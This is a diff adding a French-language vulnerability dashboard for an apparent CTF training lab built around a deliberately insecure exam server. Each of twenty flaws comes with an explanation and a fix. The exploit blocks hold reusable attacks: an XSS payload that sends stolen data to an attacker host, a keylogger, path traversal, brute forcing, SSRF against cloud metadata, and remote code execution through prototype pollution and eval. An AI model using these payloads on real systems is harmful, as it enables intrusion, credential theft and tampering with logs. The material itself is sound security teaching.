+                    <strong style="color:#ccc;">Qu'est-ce que c'est ?</strong><br>
+                    Un endpoint de débogage a été laissé actif sur le serveur de staging. Il retourne en clair : le secret JWT, la liste complète des utilisateurs avec leurs hash de mots de passe, la configuration du serveur, le nombre de sessions actives, la version Node.js et la plateforme OS.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> Exposition totale des informations internes du serveur sans aucune authentification. Combiné avec VULN-001, cela permet la compromission complète de l'authentification.
+                    <br><br>
+                    <strong style="color:#ccc;">Contre-mesure :</strong> Désactiver ou protéger les endpoints de debug en production. Utiliser des variables d'environnement pour conditionner leur activation (<code>if (process.env.NODE_ENV !== 'production')</code>).
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block">$ curl http://[IP]:3003/api/debug
+{
+  "jwt_secret": "ensam-ctf-2024",
+  "users": [{"nom":"admin","role":"admin","motDePasse":"$2b$10$..."}],
+  "activeSessions": 3
+}</div>
+                </div>
+            </div>
+
+            <!-- VULN-003 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-003</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">IDOR — Accès aux réponses correctes</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-high">CVSS 8.6 — ÉLEVÉ</span>
+                        <span class="owasp-badge">A01:2021 Broken Access Control</span>
+                        <span class="phase-badge badge-pts">Phase 3 — Exploitation</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <strong style="color:#ccc;">Qu'est-ce qu'un IDOR ?</strong><br>
+                    Un IDOR (Insecure Direct Object Reference) est une vulnérabilité de contrôle d'accès où un attaquant peut accéder à des ressources qui ne lui appartiennent pas en modifiant simplement un identifiant dans l'URL. Le serveur utilise l'identifiant fourni directement pour accéder aux données <em>sans vérifier</em> que le demandeur est bien le propriétaire.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> N'importe qui possédant un sessionId (ou devinant celui d'un autre) peut obtenir les bonnes réponses de l'examen, rendant la tromperie triviale.
+                    <br><br>
+                    <strong style="color:#ccc;">Contre-mesure :</strong> Toujours vérifier côté serveur que <code>session.etudiantId === req.user.id</code> avant de retourner des données sensibles.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block">$ curl http://[IP]:3003/api/examen/answers/VOTRE_SESSION_ID
+# Aucune authentification requise — retourne toutes les bonnes réponses
+{
+  "answers": {
+    "qcm": [{"id":1,"reponse_correcte":"B"}, ...],
+    "redaction": [{"id":1,"reponse_modele":"..."}]
+  }
+}</div>
+                </div>
+            </div>
+
+            <!-- VULN-004 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-004</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Mass Assignment — Override de note via _note</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-critical">CVSS 9.1 — CRITIQUE</span>
+                        <span class="owasp-badge">A04:2021 Insecure Design</span>
+                        <span class="phase-badge badge-pts">Phase 7 — Actions</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <strong style="color:#ccc;">Qu'est-ce que le Mass Assignment ?</strong><br>
+                    Le Mass Assignment survient quand un serveur accepte et traite des paramètres non prévus envoyés par le client. Ici, l'endpoint <code>/api/examen/submit</code> traite un paramètre <code>_note</code> non documenté qui remplace directement la note calculée automatiquement.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> Un étudiant peut se donner la note qu'il veut (0 à 20) en ajoutant simplement <code>"_note": 20</code> dans sa requête de soumission. Invisible dans l'interface normale.
+                    <br><br>
+                    <strong style="color:#ccc;">Contre-mesure :</strong> Utiliser une liste blanche stricte des paramètres acceptés. Ne jamais laisser le client influencer la logique de calcul métier (notes, prix, permissions).
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block">$ curl -X POST http://[IP]:3003/api/examen/submit \
+    -H "Content-Type: application/json" \
+    -d '{"sessionId":"...","reponses":{},"_note":20}'
+# → {"noteSur20":20,"_overridden":true}</div>
+                </div>
+            </div>
+
+            <!-- VULN-005 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-005</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Endpoints professeur sans authentification</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-high">CVSS 7.5 — ÉLEVÉ</span>
+                        <span class="owasp-badge">A01:2021 Broken Access Control</span>
+                        <span class="phase-badge badge-pts">Phase 6 — Lateral Movement</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <strong style="color:#ccc;">Description :</strong><br>
+                    Les routes <code>/api/professeur/stats</code> et <code>/api/professeur/corrections</code> sont accessibles sans aucun token d'authentification. Elles exposent les résultats, copies et notes de tous les étudiants inscrits.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> Violation de la confidentialité des données de tous les étudiants. Un étudiant peut consulter les réponses de ses camarades et adapter sa stratégie.
+                    <br><br>
+                    <strong style="color:#ccc;">Contre-mesure :</strong> Ajouter le middleware <code>authMiddleware</code> + <code>requireRole('professeur')</code> sur toutes les routes sensibles.
+                </div>
+            </div>
+
+            <!-- VULN-006 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-006</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Serveur FTP anonyme (port 2121)</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-high">CVSS 7.5 — ÉLEVÉ</span>
+                        <span class="owasp-badge">A05:2021 Security Misconfiguration</span>
+                        <span class="phase-badge badge-pts">Phase 1 — Reconnaissance</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <strong style="color:#ccc;">Description :</strong><br>
+                    Un serveur FTP est actif sur le port 2121 avec accès anonyme (aucune authentification). Il expose tout le répertoire du serveur : code source, données des étudiants, fichiers de configuration, dossiers de backup.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> Accès en lecture à l'intégralité du filesystem du serveur, incluant <code>users.json</code> (hashes de mots de passe), <code>sessions.json</code>, et les fichiers leurre dans <code>backup/</code>.
+                    <br><br>
+                    <strong style="color:#ccc;">Contre-mesure :</strong> Désactiver le FTP en production ou utiliser SFTP avec authentification par clé. Ne jamais exposer le répertoire applicatif.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block">$ ftp [IP] 2121
+Name: anonymous
+Password: (Entrée)
+ftp> ls
+ftp> get users.json
+ftp> get backup/deploy_notes.txt</div>
+                </div>
+            </div>
+
+            <!-- VULN-007 + 008 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-007 / 008</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Backdoor admin + Master Key hardcodée</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-critical">CVSS 9.8 — CRITIQUE</span>
+                        <span class="owasp-badge">A07:2021 Auth Failures</span>
+                        <span class="phase-badge badge-pts">Phase 4 — PrivEsc</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <strong style="color:#ccc;">Description :</strong><br>
+                    Deux mécanismes permettent d'obtenir un accès admin :<br>
+                    <strong style="color:#ccc;">(1) Compte backdoor</strong> — Un compte <code>ctfadmin / R3dT3am2024</code> avec rôle admin est présent dans <code>users.json</code>, découvrable via FTP. Ce type de compte est souvent laissé par des développeurs pour les tests et oublié en production.<br>
+                    <strong style="color:#ccc;">(2) Master Key</strong> — Un endpoint <code>/api/admin/create-user</code> accepte une clé <code>EMSI-MASTER-KEY-2024</code> codée en dur, permettant de créer n'importe quel utilisateur avec n'importe quel rôle.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> Accès total à l'interface d'administration, consultation et modification de toutes les copies d'examen.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Méthode 1 — Backdoor
+$ curl -X POST http://[IP]:3003/api/auth/login \
+    -d '{"nom":"ctfadmin","motDePasse":"R3dT3am2024"}'
+
+# Méthode 2 — Master Key
+$ curl -X POST http://[IP]:3003/api/admin/create-user \
+    -d '{"masterKey":"EMSI-MASTER-KEY-2024","nom":"hacker","role":"admin"}'</div>
+                </div>
+            </div>
+
+            <!-- VULN-009 + 010 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-009 / 010</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">robots.txt informatif + Fichiers backup exposés</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-medium">CVSS 5.3 — MOYEN</span>
+                        <span class="owasp-badge">A05:2021 Security Misconfiguration</span>
+                        <span class="phase-badge badge-pts">Phase 1 — Reconnaissance</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.6;">
+                    <strong style="color:#ccc;">Description :</strong><br>
+                    Le fichier <code>/robots.txt</code> liste explicitement les chemins sensibles à ne pas indexer (<code>/api/debug</code>, <code>/api/examen/answers/</code>, etc.) et mentionne le port FTP. Par ironie, ce fichier censé "cacher" ces chemins les révèle directement aux attaquants.<br><br>
+                    Les fichiers <code>backup/deploy_notes.txt</code> et <code>backup/jwt_config.txt</code> sont accessibles via FTP. Ils contiennent : credentials admin, secret JWT, master key, liste des endpoints sensibles — une feuille de route complète pour l'attaquant.
+                </div>
+            </div>
+
+            <!-- Séparateur nouvelles vulnérabilités -->
+            <div style="margin:16px 0; padding:10px; background:#110022; border:1px solid #7c3aed; border-radius:6px; font-size:12px; color:#c084fc;">
+                ⚡ <strong>Nouvelles vulnérabilités (VULN-011 à VULN-020)</strong> — Bonus : chaque exploitation validée via <code>/api/redteam/flag</code> rapporte des points supplémentaires.
+            </div>
+
+            <!-- VULN-011 XSS -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-011</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">XSS Stocké — Champ nom/prénom</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-high">CVSS 7.4 — ÉLEVÉ</span><span class="owasp-badge">A03:2021 Injection</span><span class="phase-badge badge-pts">Delivery</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    Le nom/prénom de l'étudiant est stocké sans sanitisation et affiché via <code>innerHTML</code> dans l'interface du professeur. Un payload JavaScript dans le champ nom s'exécute dans le navigateur du professeur lorsqu'il consulte les corrections.
+                    <br><br><strong style="color:#ccc;">Impact :</strong> Vol de token admin, exfiltration de données, redirection, enregistrement de frappes clavier.
+                    <br><strong style="color:#ccc;">Fix :</strong> Utiliser <code>textContent</code> ou <code>DOMPurify.sanitize()</code> au lieu de <code>innerHTML</code>.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Payload dans le champ "nom" lors de l'inscription à l'examen
+nom = &lt;img src=x onerror="fetch('/api/debug').then(r=&gt;r.json()).then(d=&gt;fetch('http://attaquant/?d='+btoa(JSON.stringify(d))))"&gt;
+
+# Payload keylogger simplifié
+nom = &lt;script&gt;document.onkeypress=e=&gt;fetch('/api/feedback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nom:'keylog',message:e.key})})&lt;/script&gt;
+
+# Vérification: visiter /professeur.html → onglet Correction → voir si l'alert se déclenche</div>
+                </div>
+            </div>
+
+            <!-- VULN-012 Path Traversal -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-012</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Path Traversal / LFI</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-high">CVSS 8.6 — ÉLEVÉ</span><span class="owasp-badge">A01:2021 Broken Access Control</span><span class="phase-badge badge-pts">Exploitation</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    L'endpoint <code>/api/export?fichier=</code> utilise le paramètre directement dans <code>path.join()</code> sans valider que le chemin résultant reste dans le répertoire autorisé. Les séquences <code>../</code> permettent de remonter l'arborescence.
+                    <br><br><strong style="color:#ccc;">Impact :</strong> Lecture du code source, <code>users.json</code>, <code>sessions.json</code>, variables d'environnement, fichiers système.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block">$ curl "http://[IP]:3003/api/export?fichier=../../server-vuln.js"
+$ curl "http://[IP]:3003/api/export?fichier=../../users.json"
+$ curl "http://[IP]:3003/api/export?fichier=../../../Windows/System32/drivers/etc/hosts"
+# Lister un dossier
+$ curl "http://[IP]:3003/api/export?fichier=../../"</div>
+                </div>
+            </div>
+
+            <!-- VULN-013 Brute Force -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-013</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Brute Force — Pas de lockout</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-high">CVSS 7.5 — ÉLEVÉ</span><span class="owasp-badge">A07:2021 Auth Failures</span><span class="phase-badge badge-pts">PrivEsc</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    Aucun mécanisme de blocage de compte ni de captcha après X tentatives échouées. Deux comptes avec mots de passe faibles sont présents dans <code>users.json</code> (accessible via FTP) : <code>prof.martin:password</code> et <code>examens.ensam:ensam2024</code>.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Brute force avec liste de mots de passe
+for pass in admin123 password 123456 ensam2024 R3dT3am2024; do
+  echo -n "$pass: "
+  curl -s -X POST http://[IP]:3003/api/auth/login \
+    -H "Content-Type: application/json" \
+    -d "{\"nom\":\"prof.martin\",\"motDePasse\":\"$pass\"}" | grep -o '"token":"[^"]*"' || echo "fail"
+done
+
+# Crack bcrypt hors ligne (hash récupéré via FTP)
+hashcat -a 0 -m 3200 '$2a$10$...' /usr/share/wordlists/rockyou.txt</div>
+                </div>
+            </div>
+
+            <!-- VULN-014 Mass Assignment -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-014</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Mass Assignment — Élévation de rôle</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-high">CVSS 8.1 — ÉLEVÉ</span><span class="owasp-badge">A04:2021 Insecure Design</span><span class="phase-badge badge-pts">PrivEsc</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <code>PUT /api/profil/update</code> utilise <code>Object.assign(user, req.body)</code> sans liste blanche des champs autorisés. En ajoutant <code>"role":"admin"</code> dans le body, n'importe quel utilisateur authentifié peut s'octroyer les droits admin.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> Whitelist explicite : <code>const allowed = ['nom','email']; const filtered = Object.fromEntries(Object.entries(req.body).filter(([k])=>allowed.includes(k)));</code>
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Étape 1: obtenir un token (compte faible ou forgé)
+TOKEN=$(curl -s -X POST http://[IP]:3003/api/auth/login \
+  -d '{"nom":"prof.martin","motDePasse":"password"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+# Étape 2: mass assignment → élévation de rôle
+curl -s -X PUT http://[IP]:3003/api/profil/update \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"role":"admin","nom":"Hacker Admin"}'
+# → {"success":true,"user":{"role":"admin"}}</div>
+                </div>
+            </div>
+
+            <!-- VULN-015 SSRF -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-015</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">SSRF — Webhook sans validation</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-high">CVSS 8.6 — ÉLEVÉ</span><span class="owasp-badge">A10:2021 SSRF</span><span class="phase-badge badge-pts">Lateral Movement</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <code>POST /api/webhook/test</code> effectue une requête HTTP vers l'URL fournie sans aucune validation. Permet de scanner le réseau interne, d'accéder à des services non exposés et d'exfiltrer des données via des canaux légitimes.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> Valider que l'URL appartient à un domaine/IP autorisé. Bloquer les RFC1918 (10.x, 172.16.x, 192.168.x) et les métadonnées cloud (169.254.169.254).
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Scanner les services internes
+for port in 22 80 443 3306 5432 6379 8080 27017; do
+  curl -s -X POST http://[IP]:3003/api/webhook/test \
+    -H "Authorization: Bearer $ADMIN_TOKEN" \
+    -d "{\"url\":\"http://127.0.0.1:$port\"}" | grep -v "error" && echo "PORT $port OPEN"
+done
+
+# Accès aux métadonnées AWS/Azure (si cloud)
+curl -X POST http://[IP]:3003/api/webhook/test -H "Authorization: Bearer $TOKEN" \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'</div>
+                </div>
+            </div>
+
+            <!-- VULN-016 Type Confusion -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-016</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Type Confusion / Auth Bypass</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-critical">CVSS 9.1 — CRITIQUE</span><span class="owasp-badge">A03:2021 Injection</span><span class="phase-badge badge-pts">PrivEsc</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    Le login ne vérifie pas le type du mot de passe avant traitement. En envoyant un objet JSON avec la propriété <code>$ne</code> (NoSQL-style), l'authentification est bypassée et un token admin est émis sans connaître le mot de passe.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> <code>if (typeof motDePasse !== 'string') return res.status(400).json({error:'Type invalide'});</code>
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Bypass total — objet au lieu d'une string
+curl -s -X POST http://[IP]:3003/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"nom":"admin","motDePasse":{"$ne":""}}'
+# → {"token":"eyJ...","user":{"role":"admin"},"vuln":"VULN-016 Auth bypass triggered"}</div>
+                    <button class="flag-btn" onclick="authBypass()" style="margin-top:8px; font-size:12px; padding:6px 14px;">⚡ Exploiter maintenant</button>
+                    <div id="bypass-result" style="margin-top:8px;"></div>
+                </div>
+            </div>
+
+            <!-- VULN-017 Open Redirect -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-017</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Open Redirect</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-medium">CVSS 6.1 — MOYEN</span><span class="owasp-badge">A01:2021 Broken Access Control</span><span class="phase-badge badge-pts">Delivery</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    L'endpoint <code>/api/auth/redirect?token=TOKEN&amp;redirect=URL</code> redirige vers n'importe quelle URL sans valider le domaine de destination. Permet de créer des liens de phishing crédibles utilisant l'URL officielle du serveur EMSI.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> Valider que l'URL de redirection est relative ou appartient au domaine autorisé.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Lien de phishing — l'URL affichée est celle du vrai serveur EMSI
+http://[IP]:3003/api/auth/redirect?token=TOKEN_LEGITIME&redirect=http://faux-ensam.attaquant.com
+
+# Email de phishing
+"Cliquez ici pour accéder à votre résultat d'examen : http://192.168.1.100:3003/api/auth/redirect?token=XXX&redirect=http://attaquant.com/steal-creds"</div>
+                </div>
+            </div>
+
+            <!-- VULN-018 Prototype Pollution -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-018</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Prototype Pollution → RCE potentiel</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-critical">CVSS 9.8 — CRITIQUE</span><span class="owasp-badge">A08:2021 Integrity Failures</span><span class="phase-badge badge-pts">Actions</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <code>POST /api/config/merge</code> utilise une fonction <code>mergeDeep()</code> vulnérable qui traite la clé <code>__proto__</code> comme une clé ordinaire, polluant ainsi <code>Object.prototype</code> de tous les objets JavaScript du processus Node.js. Dans certains contextes, mène à une exécution de code arbitraire.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> Vérifier <code>if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;</code>
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Pollution basique — tous les objets héritent de isAdmin=true
+curl -X POST http://[IP]:3003/api/config/merge \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"__proto__":{"isAdmin":true,"polluted":"VULN-018"}}'
+# → prototype_pollution_test.isAdmin = true
+
+# Pollution avancée — si EJS est utilisé → RCE
+curl -X POST http://[IP]:3003/api/config/merge \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"calc\");x"}}'</div>
+                    <button class="flag-btn" onclick="exploiterProtoPollution()" style="margin-top:8px; font-size:12px; padding:6px 14px;">⚡ Polluer Object.prototype</button>
+                    <div id="proto-result" style="margin-top:8px;"></div>
+                </div>
+            </div>
+
+            <!-- VULN-019 Insecure Deserialization -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-019</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Insecure Deserialization — eval() dans JSON.parse</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-high">CVSS 8.6 — ÉLEVÉ</span><span class="owasp-badge">A08:2021 Integrity Failures</span><span class="phase-badge badge-pts">Exploitation</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    L'endpoint <code>POST /api/bases/import-unsafe</code> utilise un reviver JSON qui appelle <code>eval()</code> sur les valeurs commençant par <code>__eval__:</code>. Toute donnée importée contenant ce préfixe est exécutée comme code JavaScript côté serveur.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> Ne jamais utiliser <code>eval()</code> sur des données utilisateur. Valider le schéma avant tout traitement.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Lire une variable d'environnement
+curl -X POST http://[IP]:3003/api/bases/import-unsafe \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"data":"{\"matiere\":\"test\",\"type\":\"qcm\",\"questions\":[],\"secret\":\"__eval__:process.env\"}","filename":"test"}'
+
+# Exécuter une commande système
+curl -X POST http://[IP]:3003/api/bases/import-unsafe \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"data":"{\"rce\":\"__eval__:require(\\\"child_process\\\").execSync(\\\"whoami\\\").toString()\"}","filename":"rce_test"}'</div>
+                </div>
+            </div>
+
+            <!-- VULN-020 Log Injection -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div><span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-020</span><span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Log Injection / Log Forging</span></div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;"><span class="cvss-badge cvss-medium">CVSS 5.9 — MOYEN</span><span class="owasp-badge">A09:2021 Logging Failures</span><span class="phase-badge badge-pts">Actions (Anti-forensics)</span></div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <code>POST /api/feedback</code> concatène directement le nom et le message de l'utilisateur dans une chaîne de log. En injectant des retours à la ligne (<code>\n</code>), l'attaquant crée de fausses entrées dans les logs système pour tromper les analystes forensiques ou couvrir ses traces.
+                    <br><br><strong style="color:#ccc;">Fix :</strong> Utiliser le logging structuré : <code>logger.info('[FEEDBACK]', &#123; nom, message &#125;)</code> au lieu de concaténation.
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block"># Injection de fausses entrées de log
+curl -X POST http://[IP]:3003/api/feedback \
+  -H "Content-Type: application/json" \
+  -d "{\"nom\":\"Alice\\n[2026-04-07T10:00:00Z] info: [LOGIN] admin connected from 127.0.0.1\",\"message\":\"test\"}"
+
+# Les logs contiendront une fausse ligne d'admin connecté
+# cat logs/combined.log → ligne forgée visible par l'analyste</div>
+                    <button class="flag-btn" onclick="logInjection()" style="margin-top:8px; font-size:12px; padding:6px 14px;">⚡ Injecter dans les logs</button>
+                    <div id="log-result" style="margin-top:8px;"></div>
+                </div>
+            </div>
+
+        </div><!-- /tab-vulns -->
+
+        <!-- ═══ KILL CHAIN TAB ══════════════════════════════════════════════ -->
+        <div id="tab-killchain" class="tab-content">
+
+            <div style="font-size:12px; color:#8b949e; margin-bottom:16px; padding:10px; background:#0d1117; border:1px solid #30363d; border-radius:6px; line-height:1.7;">
+                La <strong style="color:#fff;">Cyber Kill Chain</strong> est un modèle développé par Lockheed Martin qui décrit les étapes d'une cyberattaque avancée (APT).
+                Comprendre ce modèle permet aux défenseurs d'identifier à quelle étape interrompre une attaque, et aux attaquants de planifier méthodiquement leur campagne.
+            </div>
+
+            <!-- Phase blocs -->
+            <div class="kc-phase-block">
